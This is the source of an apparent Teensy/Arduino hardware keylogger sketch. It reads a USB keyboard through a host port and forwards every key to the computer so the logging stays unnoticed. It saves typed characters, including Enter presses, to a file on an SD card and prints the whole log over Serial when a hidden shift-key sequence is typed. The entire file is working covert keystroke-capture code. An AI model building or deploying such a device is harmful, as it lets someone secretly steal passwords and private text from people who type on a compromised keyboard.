#include "USBHost_t36.h"
#include <SD.h>
#include <SPI.h>

File dataLog;

USBHost myusb;
USBHub hub1(myusb);
USBHub hub2(myusb);
USBHub hub3(myusb);
KeyboardController keyboard1(myusb);
KeyboardController keyboard2(myusb);
MIDIDevice midi1(myusb);

int dataCounter = 0;

const int chipSelect = BUILTIN_SDCARD;

void setup()
{
  while (!Serial) ; // wait for Arduino Serial Monitor
  myusb.begin();
  keyboard1.attachPress(OnPress);
  keyboard1.attachRelease(OnRelease);
  
  if (!SD.begin(chipSelect)) {
    return;
  }

  dataLog = SD.open("datalog.txt", FILE_WRITE);
}


void loop()
{
  myusb.Task();
  midi1.read();
}


void OnPress(int key)
{
  int mod = keyboard1.getModifiers();
  Serial.print(" mod:");
  Serial.println(mod);
  if (mod && mod == 1) {
    Keyboard.press(MODIFIERKEY_CTRL);
  }
  else if (mod && mod == 2) {
    Keyboard.press(MODIFIERKEY_SHIFT);
  }
  else if (mod && mod == 3) {
    Keyboard.press(MODIFIERKEY_CTRL);
    Keyboard.press(MODIFIERKEY_SHIFT);
  }
  else if (mod && mod == 5) {
    Keyboard.press(MODIFIERKEY_CTRL);
    Keyboard.press(MODIFIERKEY_ALT);
  }

  // Prints key number to serial
  /*
  Serial.println("key '");
  Serial.println((char)key);
  Serial.print("'  ");
  Serial.println(key);
  Serial.println(keyboard1.getKey());
  */

  if (key >= 1 && key <= 26 && key != 10 && key != 9 ) {

    Keyboard.press((char)(key + 96));

    Keyboard.release((char)(key + 96));

  }
  else if (key == 212) {
    Keyboard.press(KEY_DELETE);
  }
  else if (key == 209) {
    Keyboard.press(KEY_INSERT);
  }
  else if (key == 210) {
    Keyboard.press(KEY_HOME);
  }
  else if (key == 213) {
    Keyboard.press(KEY_END);
  }
  else if (key == 211) {
    Keyboard.press(KEY_PAGE_UP);
  }
  else if (key == 214) {
    Keyboard.press(KEY_PAGE_DOWN);
  }
  else if (key == 216) {
    Keyboard.press(KEY_LEFT);

  }

  else if (key == 215) {
    Keyboard.press(KEY_RIGHT);

  }
  else if (key == 218) {
    Keyboard.press(KEY_UP);

  }
  else if (key == 217) {
    Keyboard.press(KEY_DOWN);

  }
  else if (key == 9) {
    Keyboard.press(KEY_TAB);

  }
  else {

    Keyboard.press((char)key);
    dataLog = SD.open("datalog.txt", FILE_WRITE);
    if (key == 10) {
      dataLog.println("<enter>");
    }
    else {
      dataLog.print((char)key);
    }
    dataLog.close();






  }
  // Prints out datalog.txt when shift+7980 is typed
  if (mod && mod == 2 && key == 38 && dataCounter == 0) {
    dataCounter = 1;
  }
  else if (mod && mod == 2 && key == 40 && dataCounter == 1) {
    dataCounter = 2;
  }
  else if (mod  && mod == 2 && key == 42 && dataCounter == 2) {
    dataCounter = 3;
  }
  else if (mod && mod == 2 && key == 41 && dataCounter == 3) {
    dataCounter = 0;
    
    // Reads sd card to Serial
    dataLog = SD.open("datalog.txt");
    Serial.println("dump");
    while (dataLog.available()) {
      Serial.write(dataLog.read());
    }

  }
  else {
    dataCounter = 0;
  }
  Serial.println(dataCounter);
  Keyboard.release(MODIFIERKEY_CTRL);
  Keyboard.release(MODIFIERKEY_SHIFT);
  Keyboard.release(MODIFIERKEY_ALT);
}

void OnRelease(int key) {
  if (key == 212) {
    Keyboard.release(KEY_DELETE);
  }
  else if (key == 209) {
    Keyboard.release(KEY_INSERT);
  }
  else if (key == 210) {
    Keyboard.release(KEY_HOME);
  }
  else if (key == 213) {
    Keyboard.release(KEY_END);
  }
  else if (key == 211) {
    Keyboard.release(KEY_PAGE_UP);
  }
  else if (key == 214) {
    Keyboard.release(KEY_PAGE_DOWN);
  }
  else if (key == 216) {
    Keyboard.release(KEY_LEFT);
  }
  else if (key == 215) {
    Keyboard.release(KEY_RIGHT);
  }
  else if (key == 218) {
    Keyboard.release(KEY_UP);
  }
  else if (key == 217) {
    Keyboard.release(KEY_DOWN);
  }
  else if (key == 9) {
    Keyboard.release(KEY_TAB);
  }
  else {
    Keyboard.release((char)key);
  }
}




